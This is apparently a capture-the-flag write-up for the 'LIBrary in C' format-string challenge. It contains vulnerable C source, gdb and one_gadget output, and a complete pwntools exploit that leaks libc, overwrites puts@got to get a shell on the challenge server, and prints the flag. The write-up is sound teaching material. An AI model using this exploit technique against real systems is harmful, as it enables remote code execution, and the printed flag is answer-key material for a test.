# LIBrary in C
Binary Explotation, 120 points

## Description
> After making that trainwreck of a criminal database site, clam decided to move on and make a [library book manager](https://files.actf.co/e30d6d3dd83faaeb47dbe49642386c8c5fa2d39f3a948889ff7a2d8cdc39a365/library_in_c) ... but written in C ... and without any actual functionality. What a fun guy. I managed to get the [source](https://files.actf.co/ffd37383709a2617e404add43fce7fafc68d03dbe4804b95a43e4ad6308bd6bb/library_in_c.c) and a copy of [libc](https://files.actf.co/74ca69ada4429ae5fce87f7e3addb56f1b53964599e8526244fecd164b3c4b44/libc.so.6) from him as well.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	char name[64];
	char book[64];

	puts("Welcome to the LIBrary in C!");
	puts("What is your name?");
	fgets(name, 64, stdin);
	// printf works just like System.out.print in Java right?
	printf("Why hello there ");
	printf(name);
	puts("And what book would you like to check out?");
	fgets(book, 64, stdin);
	printf("Your cart:\n - ");
	printf(book);
	puts("\nThat's great and all but uh...");
	puts("It turns out this library doesn't actually exist so you'll never get your book.");
	puts("Have a nice day!");
}

```

Hints:

* The system function in libc looks pretty nice, sadly ASLR keeps changing its address every time.

## Vulnerability

The vulnerability is a *format string*

```c
	printf(name); // --> format string
	puts("And what book would you like to check out?");
	fgets(book, 64, stdin);
	printf("Your cart:\n - ");
	printf(book); // --> format string
```

## Solution

Seeing that there are two format strings we know that we can use the first one to leak a libc address, it will help us to calculate the libc base address, after that we can use the second one to overwrite a `GOT` entrece, say `puts` with a `one gadget` from the `libc` file we recived

first things first, we need a libc address that is on the stack, for that we can use the `main's return address` which is at libc, using gdb we can see that the offset is at 27.
you can see how to check the offset at [Canary Writeup](https://github.com/yuvaly0/CTFs/blob/angstrom_2020/Canary_DONE/Canary.md#solution).

```console
Welcome to the LIBrary in C!
What is your name?
%27$p
Why hello there 0x7ffff7a05b97
```

Next, we need to know the offset of this address from the libc base, with this we can calculate the libc base address and then know the address of everything we want.

Well debug with gdb and put a breakpoint in any place we want after the `printf` that gives us this address, I decided to put in `main+189`

```console
Breakpoint 1, 0x0000000000400804 in main ()
gef➤  x/i 0x7ffff7a05b97
   0x7ffff7a05b97 <__libc_start_main+231>:	mov    edi,eax
```

Great!, so the main return to `__libc_start_main+231`, so the calculation for libc base will be

```python
libc_base = leak - 231 - libc.sym['__libc_start_main']
```

One thing I got stuck on was that on the server the address we leaked really was `_libc_start_main+240`, so in my exploit.py i wrote `-240`

We want to remove 231 to get the address of `__libc_start_main`, after that we check from the libc provided to us the offset of `__libc_start_main` and reduce it to, now we got the base :)

Now, we need to know the address of the `one gadget` in the libc.
using the tool `one_gagdet` we can see we have a few options:

```console
yuvaly0@yuvalyo-blup:~/Desktop/CTFs/LIBrary_in_C_DONE$ one_gadget libc.so.6 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Those are the offsets for the `one gadget` inside the `libc.so.6`, you can check which one is good for you using gdb and checking the conditions. 

Next we need to get the address of `puts@got` to know which address to overwrite, for this `pwntools` gives us a comfortable way:

```python
e = ELF('./library_in_c')
puts_got = e.got['puts']
```

Or 

```python
puts_got = e.sym['got.puts']
```

Thats it :) we'll do the overwrite of `puts@got` using `fmtstr` of `pwntools`

```python
from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './library_in_c'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

sh = remote('shell.actf.co', 20201)
libc = ELF('./libc.so.6', checksec=False)

e = ELF(binary_path)

# ------------- plan -----------
# leak main return address using format string
# overwrite puts@got with one_gadget


sh.sendlineafter('What is your name?\n', '%27$p')
sh.recvuntil('Why hello there ')
leak = int(sh.recvline()[2:-1], 16) - 240
libc.address = leak - libc.sym['__libc_start_main']

log.info('leak: {}'.format(hex(leak)))
log.info('libc base: {}'.format(hex(libc.address)))

one_gadget = libc.address + 0x4526a
puts_got = e.got['puts']
payload = fmtstr_payload(16, {puts_got: one_gadget}, write_size='short')

log.info('one gadget: {}'.format(hex(one_gadget)))
log.info('puts@got: {}'.format(hex(puts_got)))
log.info('payload:\n{}'.format(hexdump(payload)))

sh.sendlineafter('And what book would you like to check out?', payload)

sh.interactive()
```

Output:

```console
yuvaly0@yuvalyo-blup:~/Desktop/CTFs/LIBrary_in_C_DONE$ python exploit.py 
[+] Opening connection to shell.actf.co on port 20201: Done
[*] '/home/yuvaly0/Desktop/CTFs/LIBrary_in_C_DONE/library_in_c'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] leak: 0x7f4d750ab740
[*] libc base: 0x7f4d7508b000
[*] one gadget: 0x7f4d750d026a
[*] puts@got: 0x601018
[*] payload:
    00000000  25 38 35 32  35 38 36 63  25 32 31 24  6c 6c 6e 25  │%852│586c│%21$│lln%│
    00000010  32 31 63 25  32 32 24 68  68 6e 25 31  39 31 39 30  │21c%│22$h│hn%1│9190│
    00000020  63 25 32 33  24 68 6e 61  18 10 60 00  00 00 00 00  │c%23│$hna│··`·│····│
    00000030  1d 10 60 00  00 00 00 00  1b 10 60 00  00 00 00 00  │··`·│····│··`·│····│
    00000040
[*] Switching to interactive mode

Your cart:
 -                             

 ...
 ...
 ...

$ ls
flag.txt
library_in_c
library_in_c.c
$ cat flag.txt
actf{us1ng_c_15_n3v3r_4_g00d_1d34}
```